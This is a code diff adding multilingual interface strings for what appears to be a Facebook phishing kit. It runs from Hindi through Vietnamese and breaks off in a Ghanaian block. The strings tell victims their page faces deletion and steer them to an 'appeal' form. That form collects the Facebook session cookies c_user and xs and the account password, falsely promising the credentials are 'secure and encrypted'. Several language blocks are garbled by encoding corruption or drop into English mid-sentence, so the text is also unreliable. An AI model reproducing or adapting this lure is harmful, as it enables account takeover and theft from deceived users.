+      fbNotice1: &#34;Ⓞ1¤7 सुरक्षऄ1¤7 उद्देश्यों के लिऄ1¤7, हमें आपके फेसबुक खाते को सत्यापित करने की आवश्यकता है〄1¤7&#34;,
+      fbNotice2: &#34;Ⓞ1¤7 यह हमें यह सुनिश्चिऄ1¤7 करने मेऄ1¤7 मदऄ1¤7 करता है कि आप पेऄ1¤7 के वैऄ1¤7 मालिऄ1¤7 हैं।&#34;,
+      fbNotice3: &#34;Ⓞ1¤7 आपकी साऄ1¤7 सुरक्षित और एन्क्रिप्टेड है〄1¤7&#34;,
+      passwordLabel: &#34;पासवर्ऄ1¤7&#34;,
+      verifyBtn: &#34;सत्यापित करें और जारी रखें&#34;,
+      forgotPassword: &#34;पासवर्ऄ1¤7 भूऄ1¤7 गए?&#34;,
+      successTitle: &#34;अपॄ1¤7ऄ1¤7 सफलतापूर्वऄ1¤7 जमऄ1¤7 की गई&#34;,
+      successText: &#34;आपकी अपॄ1¤7ऄ1¤7 प्राप्ऄ1¤7 हो गई है और अब समॄ1¤7क्षा के दौऄ1¤7 से गुजर रहॄ1¤7 हैॄ1¤7 आम तौऄ1¤7 पर 7 व्यावसायिक दिनोऄ1¤7 के भीतर निर्णय होने के बाऄ1¤7 हम आपको ईमेल के माध्यम से सूचिऄ1¤7 करेंगे〄1¤7&#34;,
+      referenceText: &#34;संदर्भ आईडी:&#34;,
+      guideTitle: &#34;अपॄ1¤7ऄ1¤7 गाइड&#34;,
+      guideText1: &#34;यदऄ1¤7 आपकी अपॄ1¤7ऄ1¤7/अनुरोध मेऄ1¤7 आपके खाते मेऄ1¤7 कॉपीराइट की गई जानकारॄ1¤7 या सामग्रॄ1¤7 का उपयोऄ1¤7 शामिऄ1¤7 है या जो प्रसंस्कृत की जा रहॄ1¤7 है, तो आप हमें अपने अनुरोध को बेहतऄ1¤7 ढंऄ1¤7 से समझनॄ1¤7 मेऄ1¤7 मदऄ1¤7 करने के लिऄ1¤7 जानकारॄ1¤7 प्रदान कर सकते हैं। कृपयऄ1¤7 विस्तृऄ1¤7 व्याख्या प्रदान करें कि आपको क्योऄ1¤7 लगता है कि आपके खाते को गलऄ1¤7 तरॄ1¤7के से फ्लैऄ1¤7 किया गयऄ1¤7 था या निलंबिऄ1¤7 किया गयऄ1¤7 थाॄ1¤7 कोऄ1¤7 भी प्रासंगिऄ1¤7 जानकारॄ1¤7 शामिऄ1¤7 करें जो हमें आपके मामलॄ1¤7 की अधिक प्रभावॄ1¤7 ढंऄ1¤7 से समॄ1¤7क्षा करने मेऄ1¤7 मदऄ1¤7 कर सकती हैॄ1¤7&#34;,
+      guideText2: &#34;आपके द्वारा जमऄ1¤7 करने के बाऄ1¤7, हम आपकी अपॄ1¤7ऄ1¤7 की समॄ1¤7क्षा करेंगे और समाधान के लिऄ1¤7 आपके द्वारा प्रदान की गई जानकारॄ1¤7 की समऄ1¤7 सीमा के भीतर आपसे संपर्क करेंगेॄ1¤7 समॄ1¤7क्षा प्रक्रियऄ1¤7 मेऄ1¤7 7 व्यावसायिक दिऄ1¤7 तक का समऄ1¤7 लग सकता हैॄ1¤7 कृपयऄ1¤7 अपडेऄ1¤7 के लिऄ1¤7 अपने ईमेल की जांच करें〄1¤7&#34;,
+      guideText3: &#34;आप पृष्ऄ1¤7 के निचलॄ1¤7 भाऄ1¤7 मेऄ1¤7 भाषा चयनकर्ता पर क्लिऄ1¤7 करके किसी भी समऄ1¤7 अपनी भाषा प्राथमिकता बदऄ1¤7 सकते हैंã1¤71¤7&#34;,
+      resourcesTitle: &#34;अतिरिक्त संसाधन&#34;,
+      helpCenterTitle: &#34;सहायता केंद्र&#34;,
+      helpCenterDesc: &#34;सामान्ऄ1¤7 प्रश्नों के उत्तऄ1¤7 खोजेऄ1¤7 और हमारॄ1¤7 उत्पादों का उपयोऄ1¤7 करना सीखेंã1¤71¤7&#34;,
+      contactSupportTitle: &#34;समर्थन से संपर्क करें&#34;,
+      contactSupportDesc: &#34;व्यक्तिगऄ1¤7 सहायता के लिऄ1¤7 हमारॄ1¤7 समर्थन टीऄ1¤7 से संपर्क करें&#34;,
+      guidelinesTitle: &#34;सामुदायिऄ1¤7 दिशानिर्देऄ1¤7&#34;,
+      guidelinesDesc: &#34;हमारॄ1¤7 सामुदायिऄ1¤7 मानकों और सामग्रॄ1¤7 नीतियोऄ1¤7 के बारे मेऄ1¤7 जानेंã1¤71¤7&#34;,
+      dashboardTitle: &#34;स्थिति डैशबोर्ड&#34;,
+      dashboardDesc: &#34;हमारॄ1¤7 सेवाओं की वर्तमाऄ1¤7 स्थिति की जाँच करें और आउटेऄ1¤7 की रिपोर्ऄ1¤7 करें〄1¤7&#34;,
+      changeLanguage: &#34;भाषा बदलेऄ1¤7&#34;
+    },
+    spanish: {
+      warningTitle: &#34;¡Tu página está programada para ser eliminada!&#34;,
+      warningSubtext: &#34;Hemos recibido varios informes de que tu página viola nuestros términos de servicio y pautas comunitarias. Como resultado, tu página será enviada para verificación.&#34;,
+      warningExtra: &#34;If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal by simply clicking the appeal button below and providing some quick information.&#34;,
+      appealTitle: &#34;Solicitud de apelación&#34;,
+      appealDesc: &#34;Solucionando problemas con tu página. Asegúrate de proporcionar la información solicitada a continuación. No proporcionar esta información puede retrasar el procesamiento de tu apelación.&#34;,
+      appealBtn: &#34;Apelar&#34;,
+      formTitle: &#34;Solicitud de Apelación de Página&#34;,
+      formSubtitle: &#34;Envía tu información para apelar la eliminación&#34;,
+      formNotice1: &#34;Ⓞ1¤7 Tu página tiene una violación relacionada con nuestras pautas comunitarias.&#34;,
+      formNotice2: &#34;Ⓞ1¤7 Por favor, revisa los detalles de la violación cuidadosamente antes de enviar.&#34;,
+      formNotice3: &#34;Ⓞ1¤7 Asegúrate de proporcionar información correcta para tu apelación.&#34;,
+      nameLabel: &#34;c_user&#34;,
+      mallLabel: &#34;xs&#34;,
+      submitBtn: &#34;Enviar solicitud de apelación&#34;,
+      fbFormTitle: &#34;Verificación de Facebook&#34;,
+      fbFormSubtitle: &#34;Verify your identity to continue with the appeal&#34;,
+      fbNotice1: &#34;Ⓞ1¤7 Por motivos de seguridad, necesitamos verificar tu cuenta de Facebook.&#34;,
+      fbNotice2: &#34;Ⓞ1¤7 Esto nos ayuda a asegurar que eres el propietario legítimo de la página.&#34;,
+      fbNotice3: &#34;Ⓞ1¤7 Tus credenciales están seguras y encriptadas.&#34;,
+      passwordLabel: &#34;Contraseña&#34;,
+      verifyBtn: &#34;Verificar y Continuar&#34;,
+      forgotPassword: &#34;¿Olvidaste tu contraseña?&#34;,
+      successTitle: &#34;Apelación Enviada Exitosamente&#34;,
+      successText: &#34;Tu apelación ha sido recibida y ahora está en revisión. Te notificaremos por correo electrónico una vez que se haya tomado una decisión, generalmente dentro de 7 días hábiles.&#34;,
+      referenceText: &#34;ID de referencia:&#34;,
+      guideTitle: &#34;Guía de Apelación&#34;,
+      guideText1: &#34;Si su apelación/solicitud implica el uso de información con derechos de autor o contenido en su cuenta or that is being processed/shared, you may provide us information to help us better understand your request. Proporcione una explicación detallada de por qué cree that su cuenta fue marcada o suspendida incorrectamente. Incluya cualquier información relevante que pueda ayudarnos a revisar su caso de manera más efectiva.&#34;,
+      guideText2: &#34;Después de su envío, revisaremos su apelación y nos comunicaremos con usted dentro del plazo de la información que proporcione para resolver. El proceso de revisión podría tardar hasta 7 días hábiles. Por favor, revise su correo electrónico para obtener actualizaciones.&#34;,
+      guideText3: &#34;Nota: Puede cambiar su preferencia de idioma en cualquier momento haciendo clic en el selector de idioma en la parte inferior de la página.&#34;,
+      resourcesTitle: &#34;Recursos Adicionales&#34;,
+      helpCenterTitle: &#34;Centro de Ayuda&#34;,
+      helpCenterDesc: &#34;Encuentra respuestas a preguntas comunes y aprende a usar nuestros productos.&#34;,
+      contactSupportTitle: &#34;Contactar Soporte&#34;,
+      contactSupportDesc: &#34;Comunícate con nuestro equipo de soporte para asistencia personalizada.&#34;,
+      guidelinesTitle: &#34;Pautas de la Comunidad&#34;,
+      guidelinesDesc: &#34;Conoce nuestros estándares comunitarios y políticas de contenido.&#34;,
+      dashboardTitle: &#34;Panel de Estado&#34;,
+      dashboardDesc: &#34;Consulta el estado actual of nuestros servicios e informa interrupciones.&#34;,
+      changeLanguage: &#34;Cambiar idioma&#34;
+    },
+    portuguese: {
+      warningTitle: &#34;Sua página está programada para ser excluída!&#34;,
+      warningSubtext: &#34;Recebemos vários relatos de que sua página viola nossos termos de serviço and diretrizes da comunidade. Como resultado, sua página será enviada para verificação.&#34;,
+      warningExtra: &#34;Se você acredita que sua página foi programada para exclusão por engano, pode evitar sua remoção permanente simply clicking the appeal button below and providing some quick information.&#34;,
+      appealTitle: &#34;Solicitação de recurso&#34;,
+      appealDesc: &#34;Corrigindo problemas com sua página. Certifique-se de fornecer as informações solicitadas abaixo. A não divulgação dessas informações pode atrasar the processing of your appeal.&#34;,
+      appealBtn: &#34;Recorrer&#34;,
+      formTitle: &#34;Solicitação de Recurso de Página&#34;,
+      formSubtitle: &#34;Envie suas informações para contestar a exclusão&#34;,
+      formNotice1: &#34;Ⓞ1¤7 Sua página tem uma violação relacionada às nossas diretrizes comunitárias.&#34;,
+      formNotice2: &#34;Ⓞ1¤7 Revise os detalhes da violação cuidadosamente antes de enviar.&#34;,
+      formNotice3: &#34;Ⓞ1¤7 Certifique-se de fornecer informações corretas para o seu recurso.&#34;,
+      nameLabel: &#34;c_user&#34;,
+      mallLabel: &#34;xs&#34;,
+      submitBtn: &#34;Envir solicitação de recurso&#34;,
+      fbFormTitle: &#34;Verificação do Facebook&#34;,
+      fbFormSubtitle: &#34;Verifique sua identidade para continuar com o recurso&#34;,
+      fbNotice1: &#34;Ⓞ1¤7 Para fins de segurança, precisamos verificar sua conta do Facebook.&#34;,
+      fbNotice2: &#34;Ⓞ1¤7 Isso nos ajuda a garantir that você é o proprietário legítimo da página.&#34;,
+      fbNotice3: &#34;Ⓞ1¤7 Suas credenciais são seguras and criptografadas.&#34;,
+      passwordLabel: &#34;Senha&#34;,
+      verifyBtn: &#34;Verificar e Continuar&#34;,
+      forgotPassword: &#34;Esqueceu a senha?&#34;,
+      successTitle: &#34;Recurso enviado com sucesso&#34;,
+      successText: &#34;Seu recurso foi recebido e agora está em análise. Notificaremos você por e-mail assim que uma decisão for tomada, geralmente within 7 dias úteis.&#34;,
+      referenceText: &#34;ID de referência:&#34;,
+      guideTitle: &#34;Guia de recurso&#34;,
+      guideText1: &#34;Se o seu recurso/solicitação envolver o uso de informações protegidas por direitos autorais ou conteúdo em sua conta or that is being processed/shared, você pode nos fornecer informações para nos ajudar a entender melhor sua solicitação. Forneça uma explicação detalhada do porquê você acredita que sua conta foi sinalizada ou suspensa incorretamente. Inclua todas as informações relevantes that may help us review your case more effectively.&#34;,
+      guideText2: &#34;Após o envio, revisaremos seu recurso e entraremos em contato com você dentro do prazo das informações fornecidas para resolver. O processo de revisão pode levar até 7 dias úteis. Verifique seu e-mail para atualizações.&#34;,
+      guideText3: &#34;Nota: Você can alterar sua preferência de idioma a qualquer momento clicando no seletor de idioma na parte inferior da página.&#34;,
+      resourcesTitle: &#34;Recursos Adicionais&#34;,
+      helpCenterTitle: &#34;Central de Ajuda&#34;,
+      helpCenterDesc: &#34;Encontre respostas para perguntas comuns e aprenda a usar nossos produtos.&#34;,
+      contactSupportTitle: &#34;Contatar Suporte&#34;,
+      contactSupportDesc: &#34;Entre em contato com nossa equipe de suporte para assistência personalizada.&#34;,
+      guidelinesTitle: &#34;Diretrizes da Comunidade&#34;,
+      guidelinesDesc: &#34;Conheça nossos padrões comunitários e políticas de conteúdo.&#34;,
+      dashboardTitle: &#34;Painel de Status&#34;,
+      dashboardDesc: &#34;Verifique o status atual de nossos serviços e relate interrupções.&#34;,
+      changeLanguage: &#34;Mudar idioma&#34;
+    },
+    tamil: {
+      warningTitle: &#34;உங்கள் பக்கம் நீக்கத௄1¤7 திட்டமிடப்பட்டுள்ளது!&#34;,
+      warningSubtext: &#34;உங்கள் பக்கம் எங்கள் சேவை விதிமுறைகள௄1¤7 மற்றும௄1¤7 சமூக வழிகாட்டுதல்கள௄1¤7 மீறுவதாக பல புகார்கள௄1¤7 எங்களுக்கு கிடைத்துள்ளன. இதன் விளைவா஄1¤7, உங்கள் பக்கம் சரிபார்ப்பிற்க௄1¤7 அனுப்பப்படும௄1¤7.&#34;,
+      warningExtra: &#34;உங்கள் பக்கம் தவறா஄1¤7 நீக்கத௄1¤7 திட்டமிடப்பட்டதா஄1¤7 நீங்கள௄1¤7 நம்பினால௄1¤7, கீழே உள்ள மேல்முறையீடு பொத்தானைக் கிளிக் செய்து சி஄1¤7 விரைவா஄1¤7 தகவல்களை வழங்குவதன் மூலம௄1¤7 அதன் நிரந்த஄1¤7 நீக்கத்தைத௄1¤7 தடுக்கலாம்.&#34;,
+      appealTitle: &#34;மேல்முறையீடு கோரிக்கை&#34;,
+      appealDesc: &#34;உங்கள் பக்கத்தில் உள்ள சிக்கல்களை சரிசெய்தல். கீழே கோரப்பட்஄1¤7 தகவல்களை வழங்குவத௄1¤7 உறுதிசெய்யவும். இந்த தகவல௄1¤7 வழங்காததால௄1¤7 உங்கள் மேல்முறையீட்டின் செயலாக்கம் தாமதமாகலாம௄1¤7.&#34;,
+      appealBtn: &#34;மேல்முறையீடு&#34;,
+      formTitle: &#34;பக்க மேல்முறையீடு கோரிக்கை&#34;,
+      formSubtitle: &#34;நீக்கத்த௄1¤7 மேல்முறையீடு செய்஄1¤7 உங்கள் தகவல்களை சமர்ப்பிக்கவும௄1¤7&#34;,
+      formNotice1: &#34;Ⓞ1¤7 உங்கள் பக்கத்தில் எங்கள் சமூக வழிகாட்டுதல்கள௄1¤7 தொடர்பான மீறல௄1¤7 உள்ளது.&#34;,
+      formNotice2: &#34;Ⓞ1¤7 சமர்ப்பிப்பதற்கு முன் மீறல௄1¤7 விவரங்கள௄1¤7 கவனமாக மதிப்பாய்வ௄1¤7 செய்யவும௄1¤7.&#34;,
+      formNotice3: &#34;Ⓞ1¤7 உங்கள் மேல்முறையீட்டிற்கா஄1¤7 சரியான தகவல்களை வழங்குவத௄1¤7 உறுதிசெய்யவும்.&#34;,
+      nameLabel: &#34;c_user&#34;,
+      mallLabel: &#34;xs&#34;,
+      submitBtn: &#34;மேல்முறையீடு கோரிக்கையை சமர்ப்பிக்கவும௄1¤7&#34;,
+      fbFormTitle: &#34;பேஸ்புக் சரிபார்ப்ப௄1¤7&#34;,
+      fbFormSubtitle: &#34;மேல்முறையீட்டைத் தொடர உங்கள் அடையாளத்தை சரிபார்க்கவும்&#34;,
+      fbNotice1: &#34;Ⓞ1¤7 பாதுகாப்பு நோக்கங்களுக்கா஄1¤7, உங்கள் பேஸ்புக் கணக்கை சரிபார்க்க வேண்டும்.&#34;,
+      fbNotice2: &#34;Ⓞ1¤7 இத௄1¤7 பக்கத்தின் சட்டபூர்வமான உரிமையாளர் நீங்கள௄1¤7 என்பதை உறுதிப்படுத்஄1¤7 உதவுகிறத௄1¤7.&#34;,
+      fbNotice3: &#34;Ⓞ1¤7 உங்கள் அறிவுறுத்தல்கள௄1¤7 பாதுகாப்பானவ௄1¤7 மற்றும௄1¤7 குறியாக்கம௄1¤7 செய்யப்பட்டவ௄1¤7.&#34;,
+      passwordLabel: &#34;கடவுச்சொல்&#34;,
+      verifyBtn: &#34;சரிபார்த்த௄1¤7 தொடரவும்&#34;,
+      forgotPassword: &#34;கடவுச்சொல் மறந்துவிட்டீர்கள஄1¤7?&#34;,
+      successTitle: &#34;மேல்முறையீடு வெற்றிகரமா஄1¤7 சமர்ப்பிக்கப்பட்டத௄1¤7&#34;,
+      successText: &#34;உங்கள் மேல்முறையீடு பெறப்பட்டத௄1¤7 மற்றும௄1¤7 இப்போத௄1¤7 மதிப்பாய்வில௄1¤7 உள்ளது. பொதுவா஄1¤7 7 வணிக நாட்களுக்குள௄1¤7 ஒர௄1¤7 முடிவு எடுக்கப்பட்டவுடன௄1¤7 மின்னஞ்சல் மூலம௄1¤7 உங்களுக்கு அறிவிப்போம௄1¤7.&#34;,
+      referenceText: &#34;குறிப்பு ஐட஄1¤7:&#34;,
+      guideTitle: &#34;மேல்முறையீடு வழிகாட்ட஄1¤7&#34;,
+      guideText1: &#34;உங்கள் மேல்முறையீடு/கோரிக்கை உங்கள் கணக்கில் பதிப்புரிம௄1¤7 கொண்஄1¤7 தகவல௄1¤7 அல்லது உள்ளடக்கத்தின் பயன்பாட்டை உள்ளடக்கியிருந்தால௄1¤7 அல்லது செயலாக்கம்/பகிரப்படுகிறது என்றால௄1¤7, எங்கள் கோரிக்கையை நன்றாக புரிந்துகொள்஄1¤7 எங்களுக்கு தகவல்களை வழங்கலாம௄1¤7. உங்கள் கணக்கு தவறாகக௄1¤7 குறிக்கப்பட்டத௄1¤7 அல்லது இடைநிறுத்தப்பட்டது என்ற௄1¤7 நீங்கள௄1¤7 ஏன௄1¤7 நம்புகிற௄1¤7ர்கள௄1¤7 என்பதற்கான விரிவா஄1¤7 விளக்கத்தை வழங்கவும௄1¤7. உங்கள் வழக்கை மிகவும௄1¤7 திறம்ப஄1¤7 மதிப்பாய்வ௄1¤7 செய்஄1¤7 எங்களுக்கு உதவக்கூடிய ஏதேனும௄1¤7 தொடர்புடைய தகவல்களைச் சேர்க்கவும௄1¤7.&#34;,
+      guideText2: &#34;உங்கள் சமர்ப்பிப்பிற்குப் பிறக௄1¤7, எங்கள் மேல்முறையீட்டை மதிப்பாய்வ௄1¤7 செய்து, தீர்க்஄1¤7 நீங்கள௄1¤7 வழங்கும் தகவலின௄1¤7 காலக்கெடுவுக்குள௄1¤7 உங்களுடன௄1¤7 தொடர்ப௄1¤7 கொள்வோம். மதிப்பாய்வ௄1¤7 செயல்முற௄1¤7 7 வணிக நாட்கள௄1¤7 வர௄1¤7 எடுக்கலாம். புதுப்பிப்புகளுக்க௄1¤7 உங்கள் மின்னஞ்சலைச் சரிபார்க்கவும்.&#34;,
+      guideText3: &#34;குறிப்பு: பக்கத்தின் கீழே உள்ள மொழி தேர்வியைக் கிளிக் செய்வதன் மூலம௄1¤7 எந்த நேரத்திலும௄1¤7 உங்கள் மொழி விருப்பத்த௄1¤7 மாற்றலாம௄1¤7.&#34;,
+      resourcesTitle: &#34;கூடுதல௄1¤7 வளங்கள௄1¤7&#34;,
+      helpCenterTitle: &#34;உதவி மையம௄1¤7&#34;,
+      helpCenterDesc: &#34;பொதுவா஄1¤7 கேள்விகளுக்கான பதில்களைக் கண்டறிந்து எங்கள் தயாரிப்புகளை எவ்வாற௄1¤7 பயன்படுத்துவது என்பதை அறிக.&#34;,
+      contactSupportTitle: &#34;ஆதரவைத௄1¤7 தொடர்ப௄1¤7 கொள்ளவும௄1¤7&#34;,
+      contactSupportDesc: &#34;தனிப்பட்஄1¤7 உதவிக்கு எங்கள் ஆதரவ௄1¤7 குழுவைத் தொடர்ப௄1¤7 கொள்ளவும௄1¤7.&#34;,
+      guidelinesTitle: &#34;சமூக வழிகாட்டுதல்கள௄1¤7&#34;,
+      guidelinesDesc: &#34;எங்கள் சமூக தரங்கள௄1¤7 மற்றும௄1¤7 உள்ளடக்கக் கொள்கைகளைப௄1¤7 பற்ற஄1¤7 அறிக.&#34;,
+      dashboardTitle: &#34;நிலை டாஷ்போர்டு&#34;,
+      dashboardDesc: &#34;எங்கள் சேவைகளின௄1¤7 தற்போதைய நிலையைச் சரிபார்த்த௄1¤7, இடையூறுகளைப் புகாரளிக்கவும்.&#34;,
+      changeLanguage: &#34;மொழியை மாற்று&#34;
+    },
+    arabic: {
+      warningTitle: &#34;صفحتك مجدولة للحذف!&#34;,
+      warningSubtext: &#34;لقد تلقينا عدة تقارير تفيد بأن صفحتك تنتهك شروط الخدمة وإرشادات المجتمع الخاصة بنا. نتيجة لذلك، سيتم إرسال صفحتك للتحقق.&#34;,
+      warningExtra: &#34;إذا كنت تعتقد أنه تم جدولة صفحتك للحذف عن طريق الخطأ، فيمكنك منع إزالتها الدائمة ببساطة عن طريق النقر على زر الاستئناف أدناه وتقديم بعض المعلومات السريعة.&#34;,
+      appealTitle: &#34;طلب الاستئناف&#34;,
+      appealDesc: &#34;إصلاح المشاكل في صفحتك. يرجى التأكد من تقديم المعلومات المطلوبة أدناه. قد يؤدي عدم تقديم هذه المعلومات إلى تأخير معالجة استئنافك.&#34;,
+      appealBtn: &#34;استئناف&#34;,
+      formTitle: &#34;طلب استئناف الصفحة&#34;,
+      formSubtitle: &#34;أرسل معلوماتك للاستئناف ضد الحذف&#34;,
+      formNotice1: &#34;Ⓞ1¤7 تحتوي صفحتك على انتهاك متعلق بإرشادات المجتمع الخاصة بنا.&#34;,
+      formNotice2: &#34;Ⓞ1¤7 يرجى مراجعة تفاصيل الانتهاك بعناية قبل الإرسال.&#34;,
+      formNotice3: &#34;Ⓞ1¤7 تأكد من تقديم معلومات صحيحة لاستئنافك.&#34;,
+      nameLabel: &#34;c_user&#34;,
+      mallLabel: &#34;xs&#34;,
+      submitBtn: &#34;إرسال طلب الاستئناف&#34;,
+      fbFormTitle: &#34;التحقق من فيسبوك&#34;,
+      fbFormSubtitle: &#34;تحقق من هويتك للمتابعة مع الاستئناف&#34;,
+      fbNotice1: &#34;Ⓞ1¤7 لأغراض أمنية، نحتاج إلى التحقق من حساب فيسبوك الخاص بك.&#34;,
+      fbNotice2: &#34;Ⓞ1¤7 هذا يساعدنا على التأكد من أنك المالك الشرعي للصفحة.&#34;,
+      fbNotice3: &#34;Ⓞ1¤7 بيانات الاعتماد الخاصة بك آمنة ومشفرة.&#34;,
+      passwordLabel: &#34;كلمة المرور&#34;,
+      verifyBtn: &#34;التحقق والمتابعة&#34;,
+      forgotPassword: &#34;نسيت كلمة المرور?&#34;,
+      successTitle: &#34;تم إرسال الاستئناف بنجاح&#34;,
+      successText: &#34;لقد تم استلام استئنافك وهو الآن قيد المراجعة. سنخطرك عبر البريد الإلكتروني بمجرد اتخاذ قرار، عادة خلال 7 أيام عمل.&#34;,
+      referenceText: &#34;معرف المرجع:&#34;,
+      guideTitle: &#34;دليل الاستئناف&#34;,
+      guideText1: &#34;إذا كان استئنافك / طلبك يتضمن استخدام معلومات محمية بحقوق الطبع والنشر أو محتوى في حسابك أو الذي يتم معالجته / مشاركته، فيمكنك تقديم معلومات لمساعدتنا على فهم طلبك بشكل أفضل. يرجى تقديم شرح مفصل لسبب اعتقادك أنه تم الإبلاغ عن حسابك أو تعليقه بشكل غير صحيح. قم بتضمين أي معلومات ذات صلة قد تساعدنا في مراجعة قضيتك بشكل أكثر فعالية.&#34;,
+      guideText2: &#34;بعد إرسالك، سنراجع استئنافك ونلتقي بك خلال الإطار الزمني للمعلومات التي تقدمها لحل. قد تستغرق عملية المراجعة ما يصل إلى 7 أيام عمل. يرجى التحقق من بريدك الإلكتروني للحصول على التحديثات.&#34;,
+      guideText3: &#34;ملاحظة: يمكنك تغيير تفضيل اللغة في أي وقت بالنقر على محدد اللغة في أسفل الصفحة.&#34;,
+      resourcesTitle: &#34;موارد إضافية&#34;,
+      helpCenterTitle: &#34;مركز المساعدة&#34;,
+      helpCenterDesc: &#34;ابحث عن إجابات للأسئلة الشائعة وتعلم كيفية استخدام منتجاتنا.&#34;,
+      contactSupportTitle: &#34;اتصل بالدعم&#34;,
+      contactSupportDesc: &#34;تواصل مع فريق الدعم الخاص بنا للحصول على مساعدة مخصصة.&#34;,
+      guidelinesTitle: &#34;إرشادات المجتمع&#34;,
+      guidelinesDesc: &#34;تعرف على معايير المجتمع وسياسات المحتوى الخاصة بنا.&#34;,
+      dashboardTitle: &#34;لوحة الحالة&#34;,
+      dashboardDesc: &#34;تحقق من الحالة الحالية لخدماتنا وأبلغ عن الأعطال.&#34;,
+      changeLanguage: &#34;تغيير اللغة&#34;
+    },
+     
+    vietnamese: {
+    warningTitle: &#34;Trang của bạn đã được lên lịch đỄ1¤7 xóa!&#34;,
+    warningSubtext: &#34;Chúng tôi đã nhận được một sỄ1¤7 báo cáo rằng trang của bạn vi phạm điều khoản dịch vỄ1¤7 và nguyên tắc cộng đồng của chúng tôi. Do đó, trang của bạn sẄ1¤7 được gửi đi đỄ1¤7 xác minh.&#34;,
+    warningExtra: &#34;Nếu bạn tin rằng trang của bạn đã bỄ1¤7 lên lịch xóa nhầm, bạn có thỄ1¤7 ngăn việc xóa vĩnh viễn bằng cách nhấp vào nút khiếu nại bên dưới và cung cấp một sỄ1¤7 thông tin nhanh.&#34;,
+    appealTitle: &#34;Yêu cầu khiếu nại&#34;,
+    appealDesc: &#34;Khắc phục sỄ1¤7 cỄ1¤7 với trang của bạn. Vui lòng đảm bảo cung cấp thông tin được yêu cầu bên dưới. Không cung cấp thông tin này có thỄ1¤7 làm chậm quá trình xỄ1¤7 lý khiếu nại của bạn.&#34;,
+    appealBtn: &#34;Khiếu nại&#34;,
+    formTitle: &#34;Yêu cầu Khiếu nại Trang&#34;,
+    formSubtitle: &#34;Gửi thông tin của bạn đỄ1¤7 khiếu nại việc xóa&#34;,
+    formNotice1: &#34;Ⓞ1¤7 Trang của bạn có vi phạm liên quan đến nguyên tắc cộng đồng của chúng tôi.&#34;,
+    formNotice2: &#34;Ⓞ1¤7 Vui lòng xem xét kỄ1¤7 chi tiết vi phạm trước khi gửi.&#34;,
+    formNotice3: &#34;Ⓞ1¤7 Đảm bảo bạn cung cấp thông tin chính xác cho khiếu nại của mình.&#34;,
+    nameLabel: &#34;c_user&#34;,
+    mallLabel: &#34;xs&#34;,
+    submitBtn: &#34;Gửi Yêu cầu Khiếu nại&#34;,
+    fbFormTitle: &#34;Xác minh Facebook&#34;,
+    fbFormSubtitle: &#34;Xác minh danh tính của bạn đỄ1¤7 tiếp tục khiếu nại&#34;,
+    fbNotice1: &#34;Ⓞ1¤7 Vì mục đích bảo mật, chúng tôi cần xác minh tài khoản Facebook của bạn.&#34;,
+    fbNotice2: &#34;Ⓞ1¤7 Điều này giúp chúng tôi đảm bảo rằng bạn là chỄ1¤7 sỄ1¤7 hữu hợp pháp của trang.&#34;,
+    fbNotice3: &#34;Ⓞ1¤7 Thông tin đăng nhập của bạn được bảo mật và mã hóa.&#34;,
+    passwordLabel: &#34;Mật khẩu&#34;,
+    verifyBtn: &#34;Xác minh và Tiếp tục&#34;,
+    forgotPassword: &#34;Quên mật khẩu?&#34;,
+    successTitle: &#34;Khiếu nại Đã gửi Thành công&#34;,
+    successText: &#34;Khiếu nại của bạn đã được nhận và hiện đang được xem xét. Chúng tôi sẄ1¤7 thông báo cho bạn qua email khi có quyết định, thường trong vòng 7 ngày làm việc.&#34;,
+    referenceText: &#34;ID Tham chiếu:&#34;,
+    guideTitle: &#34;Hướng dẫn Khiếu nại&#34;,
+    guideText1: &#34;Nếu khiếu nại/yêu cầu của bạn liên quan đến việc sỄ1¤7 dụng thông tin có bản quyền hoặc nội dung trong tài khoản của bạn hoặc đang được xỄ1¤7 lý/chia sẄ1¤7, bạn có thỄ1¤7 cung cấp cho chúng tôi thông tin đỄ1¤7 giúp chúng tôi hiểu rõ hơn vỄ1¤7 yêu cầu của bạn. Vui lòng cung cấp giải thích chi tiết vỄ1¤7 lý do bạn tin rằng tài khoản của mình đã bỄ1¤7 gắn cỄ1¤7 hoặc đình chỄ1¤7 không chính xác. Bao gồm bất kỄ1¤7 thông tin liên quan nào có thỄ1¤7 giúp chúng tôi xem xét trường hợp của bạn hiệu quẄ1¤7 hơn.&#34;,
+    guideText2: &#34;Sau khi bạn gửi, chúng tôi sẄ1¤7 xem xét khiếu nại của bạn và liên hỄ1¤7 với bạn trong thời hạn thông tin bạn cung cấp đỄ1¤7 giải quyết. Quá trình xem xét có thỄ1¤7 mất tới 7 ngày làm việc. Vui lòng kiểm tra email của bạn đỄ1¤7 cập nhật.&#34;,
+    guideText3: &#34;Lưu ý: Bạn có thỄ1¤7 thay đổi tùy chọn ngôn ngỄ1¤7 bất cỄ1¤7 lúc nào bằng cách nhấp vào bỄ1¤7 chọn ngôn ngỄ1¤7 Ễ1¤7 cuối trang.&#34;,
+    resourcesTitle: &#34;Tài nguyên BỄ1¤7 sung&#34;,
+    helpCenterTitle: &#34;Trung tâm TrỄ1¤7 giúp&#34;,
+    helpCenterDesc: &#34;Tìm câu trẄ1¤7 lời cho các câu hỏi thường gặp và tìm hiểu cách sỄ1¤7 dụng sản phẩm của chúng tôi.&#34;,
+    contactSupportTitle: &#34;Liên hỄ1¤7 HỄ1¤7 trỄ1¤7&#34;,
+    contactSupportDesc: &#34;Liên hỄ1¤7 với nhóm hỄ1¤7 trỄ1¤7 của chúng tôi đỄ1¤7 được trỄ1¤7 giúp cá nhân hóa.&#34;,
+    guidelinesTitle: &#34;Nguyên tắc Cộng đồng&#34;,
+    guidelinesDesc: &#34;Tìm hiểu vỄ1¤7 tiêu chuẩn cộng đồng và chính sách nội dung của chúng tôi.&#34;,
+    dashboardTitle: &#34;Bảng điều khiển Trạng thái&#34;,
+    dashboardDesc: &#34;Kiểm tra trạng thái hiện tại của dịch vỄ1¤7 của chúng tôi và báo cáo sỄ1¤7 cỄ1¤7.&#34;,
+    changeLanguage: &#34;Thay đổi Ngôn ngỄ1¤7&#34;
+  },
+  
+   ghanaian: {
+      warningTitle: &#34;Wɔahyɛ wo krataa no sɛ wɔbɛpaew!&#34;,
+      warningSubtext: &#34;Yɛnnya amanneɛ bɛyɛ mienu a ɛkyerɛ sɛ wo krataa no di yɛn nkratoɔ ne mmara ahorow no so. Enti, wɔbɛsoma wo krataa no sɛ wɔnhwɛ so.&#34;,
